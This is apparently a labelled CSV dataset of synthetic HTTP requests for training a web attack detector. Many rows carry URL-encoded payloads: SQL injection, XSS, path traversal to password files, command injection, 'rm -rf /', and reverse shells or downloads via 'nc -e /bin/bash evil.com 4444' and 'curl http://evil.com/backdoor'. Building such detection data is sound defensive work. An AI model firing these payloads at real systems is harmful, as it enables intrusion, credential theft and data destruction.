text,label
HEAD /register?rating=..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam&phone=449&tags=system+log+entry&email=this+is+a+normal+comment User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /register title=282 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
HEAD /api/products?region=405&date=hello+world&age=%27%20AND%20%27x%27%3D%27x&tags=hello+world&rating=please+find+attached User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PATCH /docs/api search=828&category=best%20%3Cscript%20src%3D%27http%3A//evil.com/xss.js%27%3E%3C/script%3E%20order User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PATCH /register color=123%20%3Csvg/onload%3Dalert%281%29%3E%20you User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
OPTIONS /dashboard?quantity=please%20%27%20OR%20%271%27%3D%271%27--%20comment&search_term=system+log+entry&comment=603 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PUT /api/users email=%3Cbody%20onload%3Dalert%28document.domain%29%3E&q=test+user User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
GET /products/123?view=please+find+attached&author=file%3A///etc/passwd&tag=please+find+attached User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /users/456 page=%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C/a%3E&token=16&filter=669 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
POST /api/users limit=173 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
PATCH /dashboard limit=thank%20admin%27--%20you&view=thank+you User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
DELETE /api/search?color=system+log+entry&columns=1%27%20AND%20SUBSTRING%28%40%40version%2C1%2C1%29%3D%275%27--&last_name=984&old_password=127 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /api/search order=I%20%60echo%20Y2F0IC9ldGMvcGFzc3dk%20%7C%20base64%20-d%20%7C%20sh%60%20world User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PUT /api/reports region=386&new_password=John+Doe&color=405&page=615&sort=I+would+like+to+order User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
PUT /profile username=787&last_name=%27%20AND%20%27x%27%3D%27x&limit=test+user User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
GET /docs/api?username=this%20%7Cc%27a%27t%20/etc/passwd%20entry User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
HEAD /api/v1/data?title=%26%20whoami&search=751&comment=145&quantity=722 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
HEAD /api/users?search=John%20%27%3B%20SELECT%20pg_sleep%285%29--%20is User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
GET /api/reports?author=524 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
GET /posts/789?quantity=this+is+a+normal+comment&columns=best+regards&order=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
POST /api/orders content=best%20%26%20nc%20-e%20/bin/bash%20evil.com%204444%20order&q=John+Doe&order=best+regards&author=hello+world User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PATCH /api/reports last_name=best%201%27%20AND%20SUBSTRING%28%40%40version%2C1%2C1%29%3D%275%27--%20Doe&tags=588&price_min=please+find+attached&action=John+Doe&format=33 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
GET /images/logo.png?format=hello+world&color=620&session=123+Main+St&filter=112&comment=test+user User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
POST /api/orders lang=296&new_password=please+find+attached&first_name=419&password=please+find+attached User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET /contact?content=..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam&session=this+is+a+normal+comment User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
OPTIONS /contact?token=I%20%3B%20%24%28printf%20%27%5Cx6c%5Cx73%27%29%20you User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
POST /about price_min=285&lang=I+would+like+to+order&view=thank%20%27%20AND%20%27x%27%3D%27x%20you User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
GET /css/style.css?id=my+address+is&format=%26%20nc%20-e%20/bin/bash%20evil.com%204444&filters=481&search=please+find+attached&order_id=admin+access+request User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
OPTIONS /api/orders?phone=best%20%3Cbody%20onload%3Dalert%28document.domain%29%3E%20user User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /settings format=77&search_term=contact+me+at+email@example.com&password=John+Doe User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
OPTIONS /api/products?author=I+would+like+to+order&q=best%201%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables--%20regards&order=I+would+like+to+order&action=907 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PATCH /js/app.js age=contact+me+at+email@example.com&phone=this%20%3Csvg/onload%3Dalert%281%29%3E%20entry&filters=15 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
HEAD /css/style.css?age=123+Main+St&price_min=392&q=806&first_name=system+log+entry User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
DELETE /about?last_name=274&view=986&user_id=644&price_min=my+address+is&rating=80 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
HEAD /api/reports?color=contact%20%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3E%20regards User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /api/v2/analytics?quantity=thank+you&search_term=157&author=best+regards User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
OPTIONS /images/logo.png?action=test+user&tags=please%20%7C%20curl%20http%3A//evil.com/backdoor%20regards&author=best+regards User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
DELETE /settings?date=I+would+like+to+order&status=best+regards&columns=thank+you&author=519 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
PATCH /help/faq columns=%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C/a%3E&last_name=admin+access+request&age=John+Doe&price_max=741&status=thank+you User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
OPTIONS /help/faq?phone=John+Doe&page=contact+me+at+email@example.com&date=259&user_id=admin+access+request User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
POST /users/456 type=1%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables-- User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
GET /images/logo.png?old_password=170&comment=please+find+attached&phone=296 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
POST /register age=/var/www/../../etc/passwd&user_id=820&name=my+address+is User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
OPTIONS /profile?columns=admin+access+request&name=282&id=878&limit=172&search_term=admin+access+request User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
HEAD /api/v2/analytics?format=hello+world&comment=contact+me+at+email@example.com&order=thank+you User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PATCH /contact new_password=%3Cscript%20src%3D%27http%3A//evil.com/xss.js%27%3E%3C/script%3E User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
GET /register?sort=contact+me+at+email@example.com&price_min=858&username=test+user&city=492 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
DELETE /images/logo.png?quantity=472&sort=646 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PATCH /images/logo.png password=976 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
HEAD /api/reports?order_id=please+find+attached&password=12&quantity=112&date=../../../etc/passwd&format=519 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PUT /register city=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /contact new_password=947 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
DELETE /docs/api?tracking=%27%20AND%20SLEEP%285%29-- User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
HEAD /register?city=997&last_name=229&page=1%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables-- User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /users/456?author=my+address+is&city=thank+you&action=485 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
OPTIONS /settings?price_max=451&city=thank%20%26%20whoami%20request&email=110&order_id=thank+you User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
HEAD /api/search?city=this%20%27%3B%20SELECT%20pg_sleep%285%29--%20order&name=admin+access+request&rating=419&product_id=913 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
GET /images/logo.png?first_name=123+Main+St&title=538&comment=best+regards&old_password=492 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
HEAD /api/v2/analytics?name=330&price_max=270&title=system%20%27%20AND%20%27x%27%3D%27x%20user User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
DELETE /settings?old_password=402&filter=23&search=337&tracking=contact+me+at+email@example.com&order=John+Doe User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
PUT /register comment=hello%20%24%28cat%20/etc/shadow%29%20email%40example.com&tracking=668&q=717 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
GET /users/456?category=%3Cbody%20onload%3Dalert%28document.domain%29%3E User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PUT /js/app.js page=%26%20whoami&tags=102&phone=741 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /api/orders search=test%20admin%27--%20world User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
HEAD /api/orders?filters=best+regards&status=system+log+entry&order=774&first_name=thank+you&token=hello%20%27%3B%20WAITFOR%20DELAY%20%2700%3A00%3A05%27--%20you User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
HEAD /posts/789?comment=515&q=admin%27/%2A User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /contact?first_name=John+Doe User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PATCH /api/orders id=580&rating=best+regards&password=system%20%60echo%20Y2F0IC9ldGMvcGFzc3dk%20%7C%20base64%20-d%20%7C%20sh%60%20order&page=I+would+like+to+order User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
GET /contact?token=123+Main+St&tags=thank%20%3Csvg/onload%3Dalert%281%29%3E%20Doe&page=254 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
HEAD /users/456?search_term=this+is+a+normal+comment&new_password=John%20%3B%20%24%28printf%20%27%5Cx6c%5Cx73%27%29%20is&order=984&format=668&price_max=595 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
GET /js/app.js?token=/var/www/../../etc/passwd&lang=this+is+a+normal+comment&name=thank+you User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /products/123?age=thank+you User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PATCH /dashboard format=896 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
OPTIONS /api/reports?price_min=test+user User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET /dashboard?price_min=405 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
GET /register?id=test+user&content=96&product_id=135&password=test%20%27%20OR%20%271%27%3D%271%27--%20world User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
GET /dashboard?columns=best%20%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%20order&lang=523&name=my+address+is User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
OPTIONS /api/v2/analytics?status=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E&order_id=634&format=best+regards&quantity=925&city=362 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /settings?phone=I%20%60id%60%20St&region=727&tags=544&date=850 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
OPTIONS /api/v2/analytics?action=262&price_min=system%20%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E%20order&order_id=this+is+a+normal+comment&page=335 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PATCH /contact format=please+find+attached&product_id=test+user&tracking=contact+me+at+email@example.com&old_password=502 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
GET /js/app.js?columns=730 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
HEAD /users/456?product_id=852 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
DELETE /docs/api?sort=%3Cscript%20src%3D%27http%3A//evil.com/xss.js%27%3E%3C/script%3E User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
DELETE /help/faq?age=753&order_id=361 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
PATCH /register title=hello+world&region=193&format=system%20%3Csvg%20onload%3Dalert%281%29%3E%20is&order_id=685 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
OPTIONS /api/orders?quantity=admin%20....//....//....//etc/passwd%20user User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
OPTIONS /help/faq?lang=41&comment=318&new_password=564&token=780&phone=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
PUT /about title=240&quantity=987&type=best+regards&new_password=system+log+entry User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
PUT /api/products type=545&search_term=415 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
HEAD /api/users?search_term=336&price_min=953&sort=71&region=168&content=196 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
GET /help/faq?email=797&new_password=885&age=1%27%20AND%20IF%281%3D1%2CSLEEP%285%29%2C0%29--&page=139 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
HEAD /posts/789?lang=test+user&old_password=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&first_name=697&view=409 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
HEAD /profile?old_password=984&action=524 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
POST /register comment=352&category=my+address+is&last_name=test+user&filter=test+user&name=system+log+entry User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
HEAD /dashboard?first_name=admin+access+request User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
GET /about?title=516&quantity=901&id=hello+world User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
PUT /register old_password=I+would+like+to+order&password=test+user&tags=582&rating=988&new_password=please+find+attached User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
HEAD /js/app.js?new_password=%3Csvg%20onload%3Dalert%281%29%3E&columns=188 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PUT /profile old_password=511&tracking=I+would+like+to+order User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
PUT /settings action=889&status=best+regards&id=298&tags=116 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
PATCH /about search_term=hello+world&date=123%20admin%27--%20email%40example.com&old_password=test+user User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PUT /contact rating=please+find+attached&status=contact+me+at+email@example.com&order=please+find+attached&tags=contact%20%7C%20cat%20/etc/passwd%20request User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
POST /api/v1/data name=969&id=123%20%27%3B%20SELECT%20pg_sleep%285%29--%20you User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
DELETE /css/style.css?old_password=I+would+like+to+order&columns=%3Csvg%20onload%3Dalert%281%29%3E User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
HEAD /profile?author=hello+world&search=375&category=contact+me+at+email@example.com&id=my+address+is User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
GET /js/app.js?product_id=contact%20%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E%20world User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
DELETE /api/v1/data?price_max=134&filter=588 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
DELETE /settings?search_term=123%20%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL--%20user User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /login?search=thank%20%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E%20regards&product_id=I+would+like+to+order User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
OPTIONS /contact?phone=%7Cc%27a%27t%20/etc/passwd&category=128&new_password=76&city=thank+you&id=907 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /register?format=594&user_id=264&sort=my+address+is&id=123+Main+St User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
HEAD /about?action=thank+you&region=%26%20%24%28which%20bash%29%20-c%20%27ls%27&new_password=190 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /login?username=my+address+is&email=test+user&category=489 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
POST /settings order_id=contact%20%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3C/script%3Eipt%3E%20comment User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PUT /products/123 limit=123+Main+St&columns=157&date=hello+world User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
POST /help/faq columns=615&rating=admin+access+request&comment=262&username=my+address+is&tag=hello+world User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
POST /users/456 last_name=contact+me+at+email@example.com&phone=524&password=contact%20%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL--%20request&name=hello+world User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
HEAD /api/v1/data?tags=hello+world&comment=hello+world&filter=25&product_id=thank+you&author=my+address+is User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
DELETE /help/faq?author=admin+access+request&status=John+Doe&lang=938 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PATCH /api/v1/data comment=John%20%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3E%20comment User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /register sort=411&quantity=795&category=admin+access+request&search_term=123+Main+St&email=683 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PATCH /api/v2/analytics phone=test+user&limit=631 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
POST /css/style.css title=contact+me+at+email@example.com&name=thank%20%3B%20rm%20-rf%20/%20user&first_name=hello+world&color=123+Main+St User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /api/v1/data?filter=123%20%3Cbody%20onload%3Dalert%28document.domain%29%3E%20order&q=766&username=123+Main+St&category=614 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /api/users?quantity=1%27%20UNION%20ALL%20SELECT%20username%2Cpassword%2Cemail%20FROM%20users--&page=please+find+attached&username=123+Main+St User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
GET /contact?id=%3Cscript%20src%3D%27http%3A//evil.com/xss.js%27%3E%3C/script%3E&comment=contact+me+at+email@example.com&user_id=best+regards&category=test+user&filters=987 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PUT /api/users quantity=this%20%27%20OR%20%271%27%3D%271%27--%20is&token=best+regards User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
DELETE /settings?session=test+user&password=contact%20%27%20AND%201%3D2--%20you&rating=thank+you&old_password=my+address+is User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PUT /posts/789 color=862&author=875 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
POST /api/products last_name=thank%20%3B/bin/c%3F%3F%20/etc/p%3F%3F%3F%3Fd%20regards&action=123+Main+St&age=thank+you User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PATCH /profile comment=353&lang=system+log+entry User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
GET /register?password=best+regards&product_id=912 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
HEAD /js/app.js?token=contact+me+at+email@example.com&search_term=thank+you User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
OPTIONS /products/123?username=....//....//....//etc/passwd User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PATCH /api/v2/analytics title=310&search=%3Csvg%20onload%3Dalert%281%29%3E&type=this+is+a+normal+comment User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PUT /contact filters=132&action=this+is+a+normal+comment&new_password=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
POST /api/users price_min=123+Main+St&filter=212&search_term=admin+access+request&filters=test+user&product_id=86 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
OPTIONS /api/reports?search=contact+me+at+email@example.com&lang=603&format=hello+world&order_id=this%20....//....//....//etc/passwd%20you&quantity=633 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /about?type=contact+me+at+email@example.com&name=673 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
OPTIONS /products/123?name=my+address+is&region=system+log+entry&date=this%20%26%20%24%28which%20bash%29%20-c%20%27ls%27%20comment&age=735 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
DELETE /api/products?old_password=John+Doe&view=%26%20%24%28which%20bash%29%20-c%20%27ls%27 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /js/app.js session=705&quantity=319&city=453&user_id=thank+you User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PATCH /contact password=63&type=John%20%27%20AND%20%27x%27%3D%27x%20is User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
POST /dashboard tag=hello%201%27%20AND%20SUBSTRING%28%40%40version%2C1%2C1%29%3D%275%27--%20attached&page=430 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /css/style.css?region=hello+world&price_min=best+regards&filters=333&content=%26%20nc%20-e%20/bin/bash%20evil.com%204444 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
DELETE /posts/789?price_min=123+Main+St User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
OPTIONS /api/reports?price_max=contact+me+at+email@example.com&token=848&status=%7C%20cat%20/etc/passwd User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /api/reports product_id=contact+me+at+email@example.com&email=123+Main+St&password=28 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
PATCH /docs/api sort=thank+you&password=admin+access+request&price_max=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL-- User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
POST /dashboard title=hello+world&phone=my%20%27%3B%20DELETE%20FROM%20products%20WHERE%201%3D1--%20request&sort=admin+access+request User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /about?q=best+regards&limit=776&view=%3Cbody%20onload%3Dalert%28document.domain%29%3E&format=182&rating=test+user User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
OPTIONS /posts/789?color=810&search_term=561&tag=best+regards User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
DELETE /api/reports?quantity=file%3A///etc/passwd User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
POST /api/v2/analytics age=389&order_id=710&quantity=file%3A///etc/passwd&filters=274&tracking=424 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PUT /api/products type=919&email=106 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
GET /api/v2/analytics?new_password=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
HEAD /api/reports?search_term=123%20file%3A///etc/passwd%20comment&region=contact+me+at+email@example.com&tags=my+address+is User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
POST /products/123 username=378&name=318&order_id=456&view=601&product_id=662 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
PATCH /products/123 tags=John+Doe&username=%60id%60&session=612 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
DELETE /register?action=907&page=585&filter=%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C/a%3E&city=123+Main+St User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
HEAD /login?filter=997&filters=974&color=thank%20%3Csvg%20onload%3Dalert%281%29%3E%20entry&content=thank+you User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
POST /js/app.js tracking=795&old_password=contact+me+at+email@example.com&filter=694 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
DELETE /api/products?q=admin+access+request&tags=1%27%20AND%20SUBSTRING%28%40%40version%2C1%2C1%29%3D%275%27-- User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
DELETE /js/app.js?id=862&filters=test+user&product_id=635&color=admin+access+request User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
